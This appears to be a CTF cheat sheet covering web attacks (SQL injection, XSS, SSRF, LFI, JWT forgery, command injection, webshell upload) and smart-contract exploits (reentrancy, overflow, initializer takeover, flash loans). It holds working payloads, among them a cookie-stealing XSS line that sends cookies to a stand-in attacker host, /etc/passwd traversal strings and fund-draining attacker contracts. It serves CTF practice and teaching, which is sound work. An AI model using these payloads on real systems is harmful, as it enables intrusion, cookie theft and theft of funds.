MINDSET
The CTF Player's Mindset
"Think like an attacker, act like a detective."

🔍 READ EVERYTHING

Source code, comments, error messages, HTTP headers, ABI, bytecode — every byte is a clue.

💡 QUESTION ASSUMPTIONS

Developers assume users are honest. You are not a user — query boundaries, edge cases, and assumptions.

⚡ ITERATE FAST

Try, fail, analyse, adapt. Use checklists. Note everything you observe — even "nothing" is information.

📖 KNOW THE CLASSICS

90% of CTF challenges reuse known vulnerability patterns. Mastering fundamentals wins flags.

🤝 TEAM + OSINT

Divide categories. Use writeups from similar challenges. The CTF community is open — learn from it.

🏁 FLAG ANATOMY

Flags are usually: FLAG{...} or CTF{...}. Always check source, cookies, headers.

WEB · METHODOLOGY
Web CTF — Attack Methodology
  • 1
    Recon & Fingerprint whatweb, wappalyzer → identify framework, server, CMS. Check robots.txt, sitemap, .git/, /.env, /backup.zip
  • 2
    Directory / Endpoint Enumeration ffuf -u URL/FUZZ -w wordlist · gobuster · dirsearch · also fuzz params: ?id=, ?page=, ?file=
  • 3
    Intercept & Analyse Traffic Proxy with Burp Suite. Check all cookies, JWT tokens, hidden fields, custom headers (X-Forwarded-For, etc.)
  • 4
    View Source & JS Analysis Read HTML comments, JS files, AJAX endpoints, GraphQL introspection, API keys hardcoded in JS
  • 5
    Inject & Fuzz All Inputs Forms, URL params, headers, cookies — try SQLi, XSS, SSTI, command injection, path traversal payloads
  • 6
    Auth & Session Analysis Decode JWT (jwt.io). Test role escalation. Default creds. Password reset flaws. IDOR on user IDs.
  • 7
    Exploit & Capture Flag Execute attack. Flag usually in: /flag, /etc/flag, database, admin panel, response headers.
WEB · ATTACK
SQL Injection

How It Works

Unsanitised user input is concatenated into an SQL query. The attacker closes the string and appends malicious SQL to alter logic, dump data, or execute commands.

Error-based Union-based Blind Boolean Time-based Out-of-band

CTF Attack Steps

  • Inject ' → look for SQL error
  • Try ' OR 1=1-- for auth bypass
  • UNION: find column count with ORDER BY
  • Dump: UNION SELECT table_name FROM information_schema.tables
  • Automate with sqlmap -u "URL?id=1" --dbs
-- Auth bypass (classic)
username: admin'--
password: anything

-- Resulting query (vulnerable)
SELECT * FROM users WHERE user='admin'--' AND pass='anything'
WEB · ATTACK
Cross-Site Scripting (XSS)

Reflected XSS

Payload in URL param, reflected in response unsanitised. Works with victim clicking crafted link.

Stored XSS

Payload saved to database. Every visitor who views the content executes the script. Highest impact.

DOM-based XSS

Payload processed by client-side JS (innerHTML, document.write). No server interaction needed.

// Basic alert test
<script>alert(1)</script>

// Bypass filter (no script tag)
<img src=x onerror="alert(1)">
<svg onload="alert(1)">

// Cookie stealer (CTF flag via admin bot)
<script>fetch(`https://attacker.io/?c=${document.cookie}`)</script>

// CSP bypass — use dangling markup or nonce leak if misconfigured

CTF XSS Steps

1. Find reflection point → 2. Break out of context (<tag attr="HERE">) → 3. Craft payload → 4. If admin bot: steal session cookie or redirect to /flag → 5. Submit to bot URL

WEB · ATTACK
SSRF & File Inclusion

SSRF — Server-Side Request Forgery

Server fetches a URL supplied by the user. Trick it to fetch internal services.

  • Target: http://127.0.0.1/admin
  • Cloud metadata: http://169.254.169.254/latest/meta-data/
  • Bypass: http://0x7f000001/ or DNS rebinding
  • Scheme abuse: file:///etc/passwd

LFI — Local File Inclusion

Server includes a file based on user input. Read system files or achieve RCE.

  • Basic: ?page=../../../../etc/passwd
  • Null byte (old PHP): ?page=../../etc/passwd%00
  • Log poisoning → RCE via Apache log
  • PHP wrapper: php://filter/convert.base64-encode/resource=index.php
$ curl "http://target/fetch?url=http://127.0.0.1:8080/admin"
{"admin":"true","flag":"CTF{ssrf_internal_win}"}
$ curl "http://target/?page=php://filter/convert.base64-encode/resource=config.php"
PD9waHAgJGZsYWcgPSAiQ1RGe2xmaV9yZWFkfSI7
# base64 decode → flag found in config.php
WEB · ATTACK
IDOR & JWT Auth Bypass

IDOR — Insecure Direct Object Reference

Object references (IDs) expose privileged resources without authorisation check.

  • Change: /api/user/1337 → /api/user/1 (admin)
  • Fuzz numeric IDs: 0, 1, 99, -1, 0x1
  • GUIDs: predict / brute-force patterns
  • Check: GET vs POST params, JSON body fields

JWT — JSON Web Token Attacks

  • alg:none — remove signature, set alg to "none"
  • RS256→HS256 — use public key as HMAC secret
  • Weak secret — brute-force with hashcat/jwt_tool
  • kid injection — kid: ../../dev/null
// JWT Structure: header.payload.signature (base64url encoded)
// Decode at jwt.io or manually:
header  = base64url_decode("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9")
// → {"alg":"HS256","typ":"JWT"}

// alg:none bypass
forged_header = base64url('{"alg":"none","typ":"JWT"}')
forged_payload = base64url('{"user":"admin","role":"admin"}')
token = forged_header + "." + forged_payload + "."   // empty sig

// Crack with jwt_tool
python3 jwt_tool.py [TOKEN] -C -d rockyou.txt
WEB · ATTACK
Command Injection & File Upload

Command Injection

App passes user input to OS shell functions (system(), exec(), popen()).

  • Separator: ; cat /flag
  • Pipe: | id
  • Backtick: `cat /etc/passwd`
  • Subshell: $(cat /flag)
  • Blind: time-based ; sleep 5

Malicious File Upload

  • Upload .php webshell disguised as image
  • Bypass MIME check: change Content-Type to image/jpeg
  • Double extension: shell.php.jpg
  • Null byte: shell.php%00.jpg
  • Polyglot files (valid JPEG + PHP code)
  • .htaccess upload to re-enable PHP in directory
# Command Injection via ping field
POST /ping body: host=8.8.8.8; cat /flag
PING 8.8.8.8 ... CTF{rce_via_cmdi}
# Webshell (upload shell.php → access it)
$ curl http://target/uploads/shell.php?cmd=id
uid=33(www-data) gid=33(www-data)
$ curl "http://target/uploads/shell.php?cmd=cat+/flag"
CTF{webshell_rce}
BLOCKCHAIN · INTRO
Blockchain CTF Fundamentals

What Is a Smart Contract?

Self-executing code deployed on Ethereum (EVM). Written in Solidity. Once deployed the code is immutable but state can change. Holds real ETH/tokens — bugs = lost funds or stolen flags.

CTF Blockchain Setup

  • Challenge gives you: contract address + ABI (or source)
  • Goal: drain contract, call hidden function, set a variable
  • Use: Foundry (cast/forge), Hardhat, Remix IDE
  • Testnet: Goerli / Sepolia / local Anvil/Ganache

Key Concepts

  • msg.sender / tx.origin
  • msg.value (ETH sent)
  • payable functions
  • fallback() / receive()
  • Storage slots (0, 1, 2…)

Reading State

  • cast storage <addr> 0 (slot 0)
  • eth_getStorageAt RPC
  • Decompile bytecode: dedaub.com
  • All blockchain storage is PUBLIC

CTF Interaction

  • cast send <addr> "func()" —value 1ether
  • cast call <addr> "isSolved()(bool)"
  • Deploy attacker contract via forge
  • Read events: cast logs
BLOCKCHAIN · METHODOLOGY
Blockchain CTF — Solve Methodology
  • 1
    Get the Source / Decompile Challenge gives Solidity source or just bytecode. If bytecode only: use dedaub.com, panoramix, or heimdall to decompile. Read every function and modifier carefully.
  • 2
    Identify the Win Condition Find the function that checks victory: isSolved(), level == 100, balance == 0, owner == you. Work backwards from there.
  • 3
    Read All Storage Slots cast storage <addr> 0 through N. Private variables are STILL readable on-chain. Passwords, seeds, flags stored in state are trivially leaked.
  • 4
    Check Known Vuln Patterns Reentrancy, integer overflow/underflow, access control flaws, flash loan attacks — match each pattern against the source code.
  • 5
    Write Attacker Contract Write a Solidity attacker contract in Foundry or Remix. Use anvil --fork-url for local testing before sending on testnet.
  • 6
    Execute & Verify forge script / cast send the attack. Verify: cast call isSolved() returns true. Retrieve flag from emitted event or website.
BLOCKCHAIN · VULN
Reentrancy Attack

What Happens

Vulnerable contract sends ETH before updating its balance. Attacker's fallback() re-calls withdraw() recursively, draining funds. Famous: The DAO hack (2016) — $60M lost.

Spot It Fast

  • ETH transfer before state update
  • .call{value}("") usage
  • No ReentrancyGuard
  • withdraw() doesn't follow CEI pattern
// ❌ VULNERABLE CONTRACT
contract Vault {
  mapping(address => uint) public balances;
  function withdraw() public {
    uint amt = balances[msg.sender];
    (bool ok,) = msg.sender.call{value: amt}("");  // ← sends ETH first
    balances[msg.sender] = 0;                        // ← updates AFTER
  }
}

// ✅ ATTACKER CONTRACT
contract Attack {
  Vault vault;
  constructor(address v) payable { vault = Vault(v); }
  function attack() external payable { vault.deposit{value:1 ether}(); vault.withdraw(); }
  fallback() external payable { if (address(vault).balance > 0) vault.withdraw(); }
}
BLOCKCHAIN · VULN
Integer Overflow / Underflow

The Bug

Before Solidity 0.8, uint256 wraps around silently. uint8(255) + 1 = 0 (overflow). uint(0) - 1 = 2^256-1 (underflow). CTF contracts often use old Solidity to enable this.

Solidity < 0.8.0 SafeMath not used

Exploit Pattern

  • Find uint subtraction: balance -= amount
  • Send amount > balance → underflow → huge balance
  • Or overflow a uint8 counter to reset to 0
  • Check: pragma solidity ^0.6 or ^0.7 → vulnerable
// ❌ Vulnerable (Solidity 0.6.x)
contract TimeLock {
  mapping(address => uint) public lockTime;
  function increaseLockTime(uint secs) public {
    lockTime[msg.sender] += secs;   // overflow: pass 2^256 - lockTime to wrap to 0
  }
}

// Exploit: calculate overflow amount in Python
overflow_amount = 2**256 - current_lock_time
// Call increaseLockTime(overflow_amount) → lockTime becomes 0 → withdraw!
BLOCKCHAIN · VULN
Access Control Flaws

What Goes Wrong

  • Missing onlyOwner modifier → anyone calls admin fn
  • Unlocked initializer → attacker re-runs initialize() to seize ownership
  • Wrong visibility: public instead of internal/private
  • Role checks on wrong variable (role vs. address)
  • Look for: initialize(), setOwner(), changeOwner(), mint()

CTF Attack Steps

  • List every public/external function — spot unprotected admin fns
  • Check if initialize() is callable again → call it with your address
  • Look for functions that change owner/admin with no restriction
  • OpenZeppelin Ownable: check transferOwnership() is guarded
  • After gaining owner: call privileged functions to win challenge
// ❌ VULNERABLE — no access control
contract Vault {
  address public owner;
  function initialize(address _owner) public {   // ← no initializer guard!
    owner = _owner;
  }
  function withdrawAll() public {                   // ← missing onlyOwner!
    payable(msg.sender).transfer(address(this).balance);
  }
}

// ✅ EXPLOIT — call initialize again, then drain
cast send <addr> "initialize(address)" $ATTACKER --private-key $PK
cast send <addr> "withdrawAll()" --private-key $PK

// ✅ FIX
bool private initialized;
function initialize(address _owner) public {
  require(!initialized, "already init");
  initialized = true; owner = _owner;
}
BLOCKCHAIN · VULN
Flash Loan Attacks

What Is a Flash Loan?

Borrow any amount of tokens with zero collateral — as long as it is repaid within the same transaction. If repayment fails, the whole tx reverts.

  • Available from: Aave, dYdX, Uniswap V3
  • No credit check, no collateral required
  • Borrow millions of $ for a few seconds
  • Classic CTF: drain a DeFi pool in one tx

Attack Flow

  • 1️⃣ Borrow huge amount (e.g. 1M USDC) from flash loan provider
  • 2️⃣ Manipulate price oracle (spot price) with the borrowed funds
  • 3️⃣ Exploit mispriced collateral → drain under-collateralised borrows
  • 4️⃣ Or: pass a governance vote with borrowed voting tokens
  • 5️⃣ Repay flash loan + fee → keep profit
// Flash Loan Attack skeleton (Aave V2)
contract FlashAttack is IFlashLoanReceiver {
  ILendingPool pool = ILendingPool(AAVE_POOL);

  function attack() external {
    address[] memory assets = new address[](1);
    assets[0] = USDC;
    uint256[] memory amounts = new uint256[](1);
    amounts[0] = 1_000_000e6;  // borrow 1M USDC
    pool.flashLoan(address(this), assets, amounts, ...);
  }

  function executeOperation(...) external override returns (bool) {
    // ← exploit happens here with 1M USDC in hand
    vulnerableProtocol.drain();          // manipulate oracle / drain pool
    USDC.approve(address(pool), amounts[0] + premium);
    return true;                           // repay loan
  }
}

// Vulnerable: pool uses spot price as oracle
// Attack: inflate price → borrow more than allowed → repay flash loan → profit

Common CTF Targets

  • Spot-price oracles (Uniswap V2 pair)
  • Single-block governance votes
  • Re-entrancy amplified by flash loan capital
  • Liquidity pool imbalance exploits

CTF Solve Tips

  • Find: how does the contract get a price? (spot? TWAP?)
  • Spot price = manipulable → flash loan attack likely
  • Use Foundry fork: anvil --fork-url $RPC
  • forge test -vvvv to debug attack contract

WEB · CHECKLIST
Web CTF Quick Checklist

🔍 Recon

  • ☐ Check robots.txt, sitemap.xml
  • ☐ Scan /.git, /.env, /backup, /.DS_Store
  • ☐ Run ffuf/gobuster on all dirs
  • ☐ View page source + all JS files
  • ☐ Check all HTTP headers (Server, X-*, Set-Cookie)
  • ☐ Inspect all cookies (base64?, JWT?)
  • ☐ Check network tab for hidden APIs

💉 Injection Testing

  • ☐ Single quote ' in every param
  • ☐ XSS payload in every input field
  • ☐ SSTI: {{7*7}} → 49? Jinja2/Twig/Pebble
  • ☐ Path traversal: ../../../etc/passwd
  • ☐ Command injection: ;id
  • ☐ XXE if XML input exists
  • ☐ HTTP header injection

🔐 Auth / Session

  • ☐ Try admin/admin, admin/password, guest/guest
  • ☐ Decode JWT at jwt.io → tamper payload
  • ☐ Test alg:none JWT bypass
  • ☐ IDOR: change user ID in requests
  • ☐ Test account enumeration via different errors
  • ☐ Check password reset token predictability

🚩 Flag Locations

  • ☐ /flag, /flag.txt, /etc/flag
  • ☐ Database table named "flag" or "secret"
  • ☐ HTTP response headers
  • ☐ HTML source comments
  • ☐ Admin panel after login bypass
  • ☐ Env variables via RCE: env | grep FLAG

Blockchain CTF Quick Checklist

📄 Source Analysis

  • ☐ pragma solidity version → <0.8? overflow possible
  • ☐ Identify win condition (isSolved, owner check)
  • ☐ List all public/external functions
  • ☐ Find all ETH transfers (.call, .send, .transfer)
  • ☐ Spot all storage reads that should be private
  • ☐ Find all delegatecall / call usage
  • ☐ Check modifiers carefully

🔑 Common Patterns

  • ☐ Reentrancy: sends ETH before balance update?
  • ☐ Integer overflow: pragma <0.8 with no SafeMath?
  • ☐ Access control: missing onlyOwner / unlocked initializer?
  • ☐ Flash loan: spot-price oracle manipulable?
  • ☐ Single-block governance vote bypass?
  • ☐ Unchecked external call return value?

🛠️ On-chain Recon

  • ☐ Read all storage slots: cast storage addr 0..10
  • ☐ Check tx history on Etherscan
  • ☐ Decode all input data of past txs
  • ☐ Run slither for automated detection
  • ☐ Check contract ETH balance

⚡ Execution

  • ☐ Fork mainnet/testnet with anvil --fork-url
  • ☐ Write & test attack in forge test
  • ☐ Verify isSolved() = true locally first
  • ☐ Deploy to testnet, execute, verify
  • ☐ Submit transaction hash / greet challenge
